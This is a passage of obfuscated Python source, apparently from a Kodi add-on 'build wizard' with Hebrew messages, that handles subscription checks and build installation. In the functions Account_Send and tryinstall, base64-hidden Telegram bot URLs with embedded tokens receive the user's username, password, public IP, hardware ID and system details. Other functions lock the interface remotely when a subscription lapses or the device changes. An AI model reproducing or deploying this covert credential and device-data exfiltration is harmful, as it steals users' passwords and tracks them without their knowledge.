            OO0OO0O000O0OOOOO .write (OOO00OOOO0O0OOO0O .replace ('<setting id="audiooutput.audiodevice">%s</setting>'%O0OO0000000O0O000 ,'<setting id="audiooutput.audiodevice" default="true">DIRECTSOUND:default</setting>'))#line:3331
            OO0OO0O000O0OOOOO .close ()#line:3332
        except :pass #line:3333
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3336
        OO00OO00O0O0OO0O0 =OO0OO0O000O0OOOOO .read ()#line:3337
        OO0OO0O000O0OOOOO .close ()#line:3338
        try :#line:3339
            O00OO0OOO00000O0O ='<setting id="audiooutput.passthroughdevice">(.+?)</setting>'#line:3340
            O00O0O0OOO0O00OOO =re .compile (O00OO0OOO00000O0O ).findall (OO00OO00O0O0OO0O0 )[0 ]#line:3341
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3342
            OO0OO0O000O0OOOOO .write (OO00OO00O0O0OO0O0 .replace ('<setting id="audiooutput.passthroughdevice">%s</setting>'%O00O0O0OOO0O00OOO ,'<setting id="audiooutput.passthroughdevice" default="true">DIRECTSOUND:default</setting>'))#line:3343
            OO0OO0O000O0OOOOO .close ()#line:3344
        except :pass #line:3345
def get_link (O00O0O0OO0O0O000O ):#line:3350
    O00O000O00O0OO000 =time .time ()+120 #line:3352
    while (O00O0O0OO0O0O000O =='empty'or O00O0O0OO0O0O000O ==None ):#line:3353
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Anonymous TV'),'[COLOR %s]המתן לאישור התקנה על ידי - Anonymous[/COLOR]'%COLOR2 )#line:3354
          O00O0O0OO0O0O000O =readcode ()#line:3356
          if time .time ()>O00O000O00O0OO000 :#line:3357
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3359
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אין מענה[/COLOR]'%COLOR2 )#line:3360
            sys .exit ()#line:3361
            break #line:3362
    return O00O0O0OO0O0O000O #line:3363
def sync_rd ():#line:3364
    OO0OOO00O000000OO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:3365
    OOOOO0OOO00OO0O0O =wiz .getS ('rd_user')#line:3366
    OO0OO0O0OO0O0000O =wiz .getS ('rd_pass')#line:3367
    OO0OOO00O000000OO .setSetting ('auto_rd','true')#line:3369
    OO0OOO00O000000OO .setSetting ('rd_user',OOOOO0OOO00OO0O0O )#line:3370
    OO0OOO00O000000OO .setSetting ('rd_pass',OO0OO0O0OO0O0000O )#line:3371
    if not OOOOO0OOO00OO0O0O =='':#line:3373
        OOOOOOO00O0O0OO0O =[]#line:3375
        OOOOOOO00O0O0OO0O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מגדיר חשבון RD[/COLOR]'%COLOR2 ))#line:3376
        OOOOOOO00O0O0OO0O [0 ].start ()#line:3378
        from resources .libs import real_debrid #line:3379
        OO0O00OOO0O0O0OO0 =real_debrid .RealDebrid ()#line:3380
        OO0O00OOO0O0O0OO0 .auth ()#line:3381
US ='&eJwFwVEKgEAIBcAb-f67TaCkVLjoW1r29M04OfoANK6gtJl6NsUm7tTAF_ssBRcx20rW-_zf9hME$'#line:3382
def check_userdate ():#line:3384
    OO000OO0OO00O00OO =wiz .getS ("date_user")#line:3385
    import datetime #line:3386
    if not OO000OO0OO00O00OO =='':#line:3387
        OO0O0O0OO0OOOO00O =OO000OO0OO00O00OO .split ('.')#line:3388
        O0OO00OO0000OO000 =datetime .date (int (OO0O0O0OO0OOOO00O [2 ]),int (OO0O0O0OO0OOOO00O [1 ]),int (OO0O0O0OO0OOOO00O [0 ]))#line:3389
        if wiz .getS ("check_user")=='true':#line:3390
          if str (TODAY )>=str (O0OO00OO0000OO000 ):#line:3391
             wiz .setS ("check_user",'false')#line:3392
             if BUILDNAME ==" Kodi Premium":#line:3393
                 Account_Send (que (' מנוי הסתיים - התקנה פעילה '),OO000OO0OO00O00OO )#line:3394
        if str (O0OO00OO0000OO000 )>str (TODAY ):#line:3395
             wiz .setS ("check_user",'true')#line:3396
        else :#line:3397
            if not xbmc .Player ().isPlaying ():#line:3398
              if os .path .exists (os .path .join (ADDONS ,'skin.Premium.mod')):#line:3400
                    O000O00000O0OO000 =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3401
                    try :#line:3402
                        O000O000OOO0O00OO =open (O000O00000O0OO000 ,'r')#line:3403
                        O0OO0OO000OO0OO00 =O000O000OOO0O00OO .read ()#line:3404
                        O000O000OOO0O00OO .close ()#line:3405
                    except :#line:3406
                        O000O000OOO0O00OO =open (O000O00000O0OO000 ,'r',encoding ='utf-8')#line:3407
                        O0OO0OO000OO0OO00 =O000O000OOO0O00OO .read ()#line:3408
                        O000O000OOO0O00OO .close ()#line:3409
                    O000O0OO0O00O0OO0 ='<setting id="username" type="bool(.+?)/setting>'#line:3410
                    O0OO0OO0O0O00OO00 =re .compile (O000O0OO0O00O0OO0 ).findall (O0OO0OO000OO0OO00 )[0 ]#line:3411
                    if 'false'in O0OO0OO0O0O00OO00 :#line:3412
                         xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:3413
                         if wiz .getS ('dragon')=='true':#line:3414
                            wiz .contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש יש לפנות למנהלים')#line:3415
                         else :#line:3416
                           wiz .contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:3417
                         xbmc .executebuiltin ("ActivateWindow(home)")#line:3419
                         xbmc .executebuiltin ("ReloadSkin()")#line:3420
                         Account_Send (que ('מנוי ננעל'),OO000OO0OO00O00OO )#line:3421
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3422
            if BUILDNAME =="":#line:3423
              if wiz .getS ('dragon')=='true':#line:3424
                wiz .contact_wiz ('החשבון לא פעיל, \nיש לפנות למנהלים  ')#line:3425
              else :#line:3426
                wiz .contact_wiz ('החשבון לא פעיל, \nיש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:3427
              Account_Send (que (' מנוי הסתיים - התקנה חדשה'),OO000OO0OO00O00OO )#line:3428
            sys .exit ()#line:3429
        if wiz .getS ("check_user")=='true':#line:3431
            if str (ONEWEEK )>str (O0OO00OO0000OO000 ):#line:3432
             if not xbmc .Player ().isPlaying ():#line:3433
                O0000OOOOO0O00000 =wiz .getS ("show_alert")#line:3434
                OOO000O0000000000 =wiz .getS ('nextcleandate')#line:3435
                if O0000OOOOO0O00000 =='true':#line:3439
                    wiz .setS ("show_alert",'false')#line:3440
                    Account_Send (que (' מנוי עומד להסתיים '),OO000OO0OO00O00OO )#line:3441
                    if BUILDNAME ==" Kodi Premium":#line:3442
                        if wiz .getS ('dragon')=='true':#line:3443
                            wiz .contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+OO000OO0OO00O00OO +'[/COLOR]'+'\n'+'לחידוש יש לפנות למנהלים.')#line:3444
                        else :#line:3445
                            wiz .contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+OO000OO0OO00O00OO +'[/COLOR]'+'\n'+'לחידוש לשנה נוספת יש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n [COLOR red]https://t.me/xbmc19[/COLOR]')#line:3446
            else :#line:3448
                wiz .setS ("show_alert",'true')#line:3449
def check_platform ():#line:3450
    if xbmc .getCondVisibility ('system.platform.android')or xbmc .getCondVisibility ('system.platform.windows'):#line:3451
        import platform #line:3452
        OO0O00O000O0OOO00 =platform .uname ()#line:3453
        OO000OOOO00OO0O00 =OO0O00O000O0OOO00 [1 ]#line:3454
        if wiz .getS ("set_platform_name")=='false':#line:3455
            wiz .setS ("platform_name",OO000OOOO00OO0O00 )#line:3456
            wiz .setS ("set_platform_name",'true')#line:3457
        if not wiz .getS ("platform_name")==OO000OOOO00OO0O00 and not wiz .getS ("platform_name")=='':#line:3458
          if os .path .exists (os .path .join (ADDONS ,'skin.Premium.mod')):#line:3459
                OO000OO000O000O00 =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3460
                try :#line:3461
                    O0O0O0OO00OOO0000 =open (OO000OO000O000O00 ,'r')#line:3462
                    O0OOO00O0OOO0O0OO =O0O0O0OO00OOO0000 .read ()#line:3463
                    O0O0O0OO00OOO0000 .close ()#line:3464
                except :#line:3465
                    O0O0O0OO00OOO0000 =open (OO000OO000O000O00 ,'r',encoding ='utf-8')#line:3466
                    O0OOO00O0OOO0O0OO =O0O0O0OO00OOO0000 .read ()#line:3467
                    O0O0O0OO00OOO0000 .close ()#line:3468
                O00O00OOO00OO000O ='<setting id="username" type="bool(.+?)/setting>'#line:3469
                O0OO0OOOO0000OO00 =re .compile (O00O00OOO00OO000O ).findall (O0OOO00O0OOO0O0OO )[0 ]#line:3470
                if 'false'in O0OO0OOOO0000OO00 :#line:3471
                     xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:3472
                     wiz .contact_wiz ('התקנה לא חוקית, \nיש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:3473
                     xbmc .executebuiltin ("ActivateWindow(home)")#line:3475
                     xbmc .executebuiltin ("ReloadSkin()")#line:3476
                     Account_Send (que ('ניסיון העתקה - מנוי ננעל'),userdate )#line:3477
def Account_Send (O0O0000000000OOO0 ,OOOO0OOO000000000 ):#line:3478
          import json ,platform ,requests #line:3480
          OO0O0000O0OO0O0OO =(ADDON .getSetting ("user"))#line:3482
          O0000OO00O00OOO00 =(ADDON .getSetting ("pass"))#line:3483
          OO0OO0OO0OO0OOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3484
          O0O0O000O0OO0O00O =platform .uname ()#line:3485
          OO0O0O0O0OOOO0000 =O0O0O000O0OO0O00O [1 ]#line:3486
          if wiz .getS ('dragon')=='true':#line:3487
            O0O0OO0OOOOO0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDQzMjU2NjE1MTpBQUdhUUxkWm90dFQyYUZHNFpRQ19JeUFHcFJyZ0phN3d6SS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTUxMTkwOTY0JnRleHQ9').decode ('utf-8')#line:3488
          else :#line:3489
            O0O0OO0OOOOO0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwNjAyNjcwNTE6QUFIQWl5bFNENGREYzlWeGtncjJXc2o3WHhkV3FvTUhVX00vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY2NTgwNTE0OCZ0ZXh0PQ==').decode ('utf-8')#line:3490
          O0OOO0O0O0O00OOOO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:3491
          O0OOO0OOO00000OOO =OO0O0000O0OO0O0OO #line:3493
          O00000OO0OO0000OO =O0000OO00O00OOO00 #line:3494
          O0000OOO0OO0O0OOO =requests .get (O0O0OO0OOOOO0OO00 +O0O0000000000OOO0 +que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0OOO0OOO00000OOO +que (' סיסמה: ')+O00000OO0OO0000OO +que (' קודי: ')+OO0OO0OO0OO0OOO0O +que (' כתובת: ')+O0OOO0O0O0O00OOOO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0O0O0O0OOOO0000 +que (' גירסת ויזארד: ')+VERSION +que (' הסתיים בתאריך: ')+OOOO0OOO000000000 ).json ()#line:3496
def tryinstall ():#line:3497
          import json ,platform ,requests #line:3499
          OO0000O0O0OO00O0O =(ADDON .getSetting ("user"))#line:3501
          O00OO00O000O0OOO0 =(ADDON .getSetting ("pass"))#line:3502
          O0000O0O0OO00000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3503
          OOO000000O0OOO00O =platform .uname ()#line:3504
          O00000O00O00O0O0O =OOO000000O0OOO00O [1 ]#line:3505
          OOOOO000O0O000O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:3506
          OOOOO00O0O00OOO0O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:3507
          OO0000O00O000000O =OO0000O0O0OO00O0O #line:3509
          O00O0O0000O0O000O =O00OO00O000O0OOO0 #line:3510
          OOOOO0O00O00O0000 =requests .get (OOOOO000O0O000O0O +que ('מנסים להתקין: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO0000O00O000000O +que (' סיסמה: ')+O00O0O0000O0O000O +que (' קודי: ')+O0000O0O0OO00000O +que (' כתובת: ')+OOOOO00O0O00OOO0O +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O00000O00O00O0O0O +que (' גירסת ויזארד: ')+VERSION ).json ()#line:3512
def STARTP (new_install ='false'):#line:3513
    OO00OO0OOO00OOO00 =False #line:3514
    OO0O00OO000O00O0O =ADDON .getSetting ("user")#line:3516
    if not len (ADDON .getSetting ("user"))>0 :#line:3517
     if new_install =='true':#line:3518
        OOO0OOO00000O000O =xbmc .Keyboard (OO0O00OO000O00O0O ,'הכנס שם משתמש')#line:3519
        OOO0OOO00000O000O .doModal ()#line:3520
        if OOO0OOO00000O000O .isConfirmed ():#line:3521
            OO0O00OO000O00O0O =OOO0OOO00000O000O .getText ()#line:3522
            ADDON .setSetting ("user",OO0O00OO000O00O0O )#line:3523
        if OO0O00OO000O00O0O =='':#line:3524
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3525
            sys .exit ()#line:3526
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:3527
    O00O0OOO00O0OO00O =OO0O00OO000O00O0O #line:3528
    O00O0OOO00O0OO00O =O00O0OOO00O0OO00O .lower ()#line:3529
    try :#line:3530
        OOO0OO00O0O0000O0 =urlopen (ld (US ))#line:3531
        O0OO0OOOOOO0OOOO0 =OOO0OO00O0O0000O0 .readlines ()#line:3532
    except Exception as OOO0000O00O0O0000 :#line:3533
        O0OO0OOOOOO0OOOO0 =''#line:3534
        logging .warning ('לא מתחבר לשרת או שאין אינטרנט'+str (OOO0000O00O0O0000 ))#line:3535
    O000000OO00OOOOO0 =0 #line:3536
    for O0OOO00OOOO0OOOO0 in O0OO0OOOOOO0OOOO0 :#line:3538
        if O0OOO00OOOO0OOOO0 .decode ('utf-8').split (' ==')[0 ]==O00O0OOO00O0OO00O or O0OOO00OOOO0OOOO0 .decode ('utf-8').split ()[0 ]==O00O0OOO00O0OO00O :#line:3539
            O000000OO00OOOOO0 =1 #line:3540
            if '@'in O0OOO00OOOO0OOOO0 .decode ('utf-8'):#line:3542
                    wiz .setS ("dragon","true")#line:3543
            else :#line:3544
                    wiz .setS ("dragon","false")#line:3545
            try :#line:3546
                try :#line:3547
                    OO0O000O0OOO000O0 =' == (.+?) = '#line:3548
                    OO0O0O00O0O00O00O =re .compile (OO0O000O0OOO000O0 ).findall (O0OOO00OOOO0OOOO0 .decode ('utf-8'))[0 ]#line:3549
                    wiz .setS ("date_user",OO0O0O00O0O00O00O .replace ('@','').replace (' ',''))#line:3550
                except :#line:3552
                    OO0O000O0OOO000O0 =' == (.+?)\n'#line:3553
                    OO0O0O00O0O00O00O =re .compile (OO0O000O0OOO000O0 ).findall (O0OOO00OOOO0OOOO0 .decode ('utf-8'))[0 ]#line:3554
                    wiz .setS ("date_user",OO0O0O00O0O00O00O .replace ('@','').replace (' ',''))#line:3556
            except :#line:3557
                OO0O0O00O0O00O00O =''#line:3558
                wiz .setS ("date_user",OO0O0O00O0O00O00O .replace ('@','').replace (' ',''))#line:3559
            try :#line:3560
                try :#line:3561
                    O0O0OOOOOO0O0O0O0 =' = (.+?) @ '#line:3562
                    OO0000OO0O0000000 =re .compile (O0O0OOOOOO0O0O0O0 ).findall (O0OOO00OOOO0OOOO0 .decode ('utf-8'))[0 ]#line:3563
                    wiz .setS ("sync_user",OO0000OO0O0000000 .replace ('@','').replace (' ',''))#line:3564
                    wiz .setS ("pass2","true")#line:3565
                    if wiz .getS ("set_usersync")=='true':#line:3566
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:3567
                        O0O0O0O000O0OOOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:3568
                        O0O0O0O000O0OOOOO .setSetting ('firebase',OO0000OO0O0000000 .replace ('@','').replace (' ',''))#line:3569
                        user_sync ()#line:3571
                        wiz .setS ("set_usersync",'false')#line:3572
                except :#line:3573
                    O0O0OOOOOO0O0O0O0 =' = (.+?)\n'#line:3574
                    OO0000OO0O0000000 =re .compile (O0O0OOOOOO0O0O0O0 ).findall (O0OOO00OOOO0OOOO0 .decode ('utf-8'))[0 ]#line:3575
                    wiz .setS ("sync_user",OO0000OO0O0000000 .replace ('@','').replace (' ',''))#line:3576
                    wiz .setS ("pass2","true")#line:3577
                    if wiz .getS ("set_usersync")=='true':#line:3578
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:3579
                        O0O0O0O000O0OOOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:3580
                        O0O0O0O000O0OOOOO .setSetting ('firebase',OO0000OO0O0000000 .replace ('@','').replace (' ',''))#line:3581
                        user_sync ()#line:3583
                        wiz .setS ("set_usersync",'false')#line:3584
            except :#line:3586
                pass #line:3587
            break #line:3588
    O00OO000OO000000O =[]#line:3590
    OO00OOO0O0O0OOO0O =[]#line:3591
    try :#line:3592
        OO0O00O00O0OOOO00 =read_skin ('playback')#line:3593
        OO000OO0OOO0O0OO0 =read_skin_dragon ('playback')#line:3594
        O0OOO00O000OO0OOO =[OO0O00O00O0OOOO00 ,OO000OO0OOO0O0OO0 ]#line:3595
        for O0O0000O0OOO00O0O in O0OOO00O000OO0OOO :#line:3596
            for O0OO0O0000OOO00OO in O0O0000O0OOO00O0O :#line:3597
                O0OO0OO0O00O0OOO0 =O0O0000O0OOO00O0O [O0OO0O0000OOO00OO ]#line:3598
                try :#line:3599
                    O00OO000OO000000O .append ((O0OO0OO0O00O0OOO0 ['name'],O0OO0OO0O00O0OOO0 ['date'],O0OO0OO0O00O0OOO0 ['sync'],O0OO0OO0O00O0OOO0 ['dragon'],O0OO0OO0O00O0OOO0 ['device'],O0OO0OO0O00O0OOO0 ['rduser'],O0OO0OO0O00O0OOO0 ['rdpass'],O0OO0OO0O00O0OOO0 ['telegram_user'],O0OO0OO0O00O0OOO0 ['p1'],O0OO0OO0O00O0OOO0 ['p2'],O0OO0OO0O00O0OOO0 ['p3']))#line:3600
                except :#line:3601
                    OO00OOO0O0O0OOO0O .append ((O0OO0OO0O00O0OOO0 ['name'],O0OO0OO0O00O0OOO0 ['date'],O0OO0OO0O00O0OOO0 ['sync'],O0OO0OO0O00O0OOO0 ['dragon'],O0OO0OO0O00O0OOO0 ['device']))#line:3602
    except Exception as OOO0000O00O0O0000 :#line:3603
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]בעיה בשרת[/COLOR]"%COLOR2 )#line:3604
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (OOO0000O00O0O0000 ))#line:3605
              xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3606
              sys .exit ()#line:3607
    for OO0O00OOO000OOOOO ,OO0O00O000000OOO0 ,OO0000OO0O0000000 ,O000OO000OO000O0O ,O0O00O00O0000O00O ,OO000OOOOO0000OO0 ,O00000OOO0000000O ,OOOO0O0OOOO0OOO00 ,O00OOO0000000OO0O ,O0000OOO0O0OO0OO0 ,O000O0O0000O00OO0 in O00OO000OO000000O :#line:3608
        if OO0O00OOO000OOOOO .split ()[0 ].lower ()==O00O0OOO00O0OO00O :#line:3610
            O000000OO00OOOOO0 =1 #line:3612
            wiz .setS ("date_user",OO0O00O000000OOO0 .replace (' ',''))#line:3613
            wiz .setS ("device",O0O00O00O0000O00O .replace (' ',''))#line:3614
            wiz .setS ("sync_user",OO0000OO0O0000000 .replace (' ',''))#line:3615
            wiz .setS ("rd_user",OO000OOOOO0000OO0 .replace (' ',''))#line:3616
            wiz .setS ("rd_pass",O00000OOO0000000O .replace (' ',''))#line:3617
            if len (OO000OOOOO0000OO0 )>0 :#line:3618
                wiz .setS ('auto_rd','true')#line:3619
            if '@'in O000OO000OO000O0O .replace (' ',''):#line:3620
                    wiz .setS ("dragon","true")#line:3621
            else :#line:3622
                    wiz .setS ("dragon","false")#line:3623
            if len (OO0000OO0O0000000 )>0 :#line:3624
                if wiz .getS ("set_usersync")=='true':#line:3625
                 if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:3626
                    O0O0O0O000O0OOOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:3627
                    O0O0O0O000O0OOOOO .setSetting ('firebase',OO0000OO0O0000000 .replace (' ',''))#line:3628
                    user_sync ()#line:3630
                    wiz .setS ("set_usersync",'false')#line:3631
            break #line:3632
    for OO0O00OOO000OOOOO ,OO0O00O000000OOO0 ,OO0000OO0O0000000 ,O000OO000OO000O0O ,O0O00O00O0000O00O in OO00OOO0O0O0OOO0O :#line:3633
        if OO0O00OOO000OOOOO .split ()[0 ].lower ()==O00O0OOO00O0OO00O :#line:3635
            O000000OO00OOOOO0 =1 #line:3636
            wiz .setS ("date_user",OO0O00O000000OOO0 .replace (' ',''))#line:3637
            wiz .setS ("device",O0O00O00O0000O00O .replace (' ',''))#line:3638
            wiz .setS ("sync_user",OO0000OO0O0000000 .replace (' ',''))#line:3639
            if '@'in O000OO000OO000O0O .replace (' ',''):#line:3640
                    wiz .setS ("dragon","true")#line:3641
            else :#line:3642
                    wiz .setS ("dragon","false")#line:3643
            if len (OO0000OO0O0000000 )>0 :#line:3644
                if wiz .getS ("set_usersync")=='true':#line:3645
                 if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:3646
                    O0O0O0O000O0OOOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:3647
                    O0O0O0O000O0OOOOO .setSetting ('firebase',OO0000OO0O0000000 .replace (' ',''))#line:3648
                    user_sync ()#line:3650
                    wiz .setS ("set_usersync",'false')#line:3651
            break #line:3652
    if O000000OO00OOOOO0 ==0 :#line:3653
            if BUILDNAME =="":#line:3654
                OOOO00OOO0OOOOOO0 =[]#line:3655
                OOOO00OOO0OOOOOO0 .append (Thread (tryinstall ))#line:3656
                OOOO00OOO0OOOOOO0 [0 ].start ()#line:3658
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]שם המשתמש שגוי[/COLOR]"%COLOR2 )#line:3659
                wiz .setS ("user",'')#line:3662
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3664
                OO00OO0OOO00OOO00 =True #line:3666
            if BUILDNAME ==" Kodi Premium":#line:3667
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]שם המשתמש שגוי[/COLOR]"%COLOR2 )#line:3669
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3670
                OO00OO0OOO00OOO00 =True #line:3671
    else :#line:3672
        wiz .setS ("user",O00O0OOO00O0OO00O )#line:3673
    try :#line:3675
        make_setting_file ()#line:3676
    except :pass #line:3677
    check_userdate ()#line:3678
    check_platform ()#line:3679
    if OO00OO0OOO00OOO00 ==True :#line:3681
        sys .exit ()#line:3682
    else :#line:3683
      if new_install =='true':#line:3684
         check_pass ()#line:3685
    return 'ok'#line:3686
def buildWizard (OO000OO0OO00OO00O ,O0OO0OO00O0O0OOOO ,theme =None ,over =False ):#line:3687
    xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:3689
    if O0OO0OO00O0O0OOOO =='gui':#line:3693
        OOOO0O00OOOOOO0O0 =wiz .checkBuild (OO000OO0OO00OO00O ,'gui')#line:3698
        O0OO00OOO0O0O0OO0 =OO000OO0OO00OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3699
        if not wiz .workingURL (OOOO0O00OOOOOO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]עדכון המערכת אינו זמין כעת, נסו שוב מאוחר יותר.[/COLOR]'%COLOR2 );return #line:3700
        if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3701
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO0OO00OO00O )+'\n'+''+'\n'+'אנא המתן')#line:3702
        O0OO000OOOOO0O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO00OOO0O0O0OO0 )#line:3703
        O0OOO00OOOO0OO00O ='עדכון מערכת'#line:3706
        if 'google'in OOOO0O00OOOOOO0O0 :#line:3707
           googledrive_download (OOOO0O00OOOOOO0O0 ,O0OO000OOOOO0O0O0 ,DP ,wiz .checkBuild (OO000OO0OO00OO00O ,'updatesize'))#line:3708
        else :#line:3709
          downloader .download (OOOO0O00OOOOOO0O0 ,O0OO000OOOOO0O0O0 ,DP )#line:3710
        xbmc .sleep (100 )#line:3711
        OO00OO00O00000000 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00OOOO0OO00O )#line:3712
        DP .update (0 ,OO00OO00O00000000 +'\n'+''+'\n'+'אנא המתן')#line:3713
        extract .all (O0OO000OOOOO0O0O0 ,HOME ,DP ,title =OO00OO00O00000000 )#line:3714
        DP .close ()#line:3715
        try :os .remove (O0OO000OOOOO0O0O0 )#line:3718
        except :pass #line:3719
        wiz .kodi17Fix ()#line:3720
        if INSTALLMETHOD ==1 :OOOOOOO0OOOOOO000 =1 #line:3726
        elif INSTALLMETHOD ==2 :OOOOOOO0OOOOOO000 =0 #line:3727
        else :DP .close ()#line:3728
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3734
        OOO0000O00O000OOO =[]#line:3735
        OOO0000O00O000OOO .append (Thread (indicatorfastupdate ))#line:3736
        OOO0000O00O000OOO [0 ].start ()#line:3738
        if wiz .getS ("dragon")=='true':#line:3739
          try :#line:3740
              open_dragon_menu_hub ()#line:3741
          except Exception as O0O0OOOOO0OOO00O0 :#line:3742
             logging .warning ('dragon hub errrrrrrror'+str (O0O0OOOOO0OOO00O0 ))#line:3743
        else :#line:3744
          try :#line:3745
              close_dragon_menu_hub ()#line:3746
          except Exception as O0O0OOOOO0OOO00O0 :#line:3747
             logging .warning ('dragon hub errrrrrrror'+str (O0O0OOOOO0OOO00O0 ))#line:3748
        if wiz .getS ('sex')=='false':#line:3749
            sex_menu_luck (notify ='false')#line:3750
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:3751
    elif O0OO0OO00O0O0OOOO =='fresh':#line:3757
            if not BUILDNAME =='':#line:3762
                O00O00O00OOOOOOOO =xbmcgui .Dialog ()#line:3763
                OOO0O0000OO00O0O0 =O00O00O00OOOOOOOO .yesno (ADDONTITLE ,"[COLOR %s]הבילד כבר מותקן, [COLOR %s]%s[/COLOR]האם תרצה להתקין אותו שוב?[/COLOR]"%(COLOR2 ,COLOR1 ,''),yeslabel ="[B]כן[/B]",nolabel ="[B]לא[/B]")#line:3764
                if OOO0O0000OO00O0O0 ==0 :#line:3766
                    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3767
                    sys .exit ()#line:3768
            check ()#line:3770
            STARTP (new_install ='true')#line:3771
            OOO0000O00O000OOO =[]#line:3773
            OOO0000O00O000OOO .append (Thread (start_install ,'מבקש אישור להתקין - '))#line:3774
            OOO0000O00O000OOO [0 ].start ()#line:3776
            OOOO0O00OOOOOO0O0 =ld (get_link (code_link ))#line:3783
            OOO0000O00O000OOO =[]#line:3785
            OOO0000O00O000OOO .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה מתחילה, אנא המתן...[/COLOR]'%COLOR2 ))#line:3786
            OOO0000O00O000OOO [0 ].start ()#line:3788
            OOO0000O00O000OOO =[]#line:3790
            OOO0000O00O000OOO .append (Thread (start_install ,'ההתקנה אושרה '))#line:3791
            OOO0000O00O000OOO [0 ].start ()#line:3793
            freshStart (OO000OO0OO00OO00O )#line:3798
            O0OO00OOO0O0O0OO0 =OO000OO0OO00OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3803
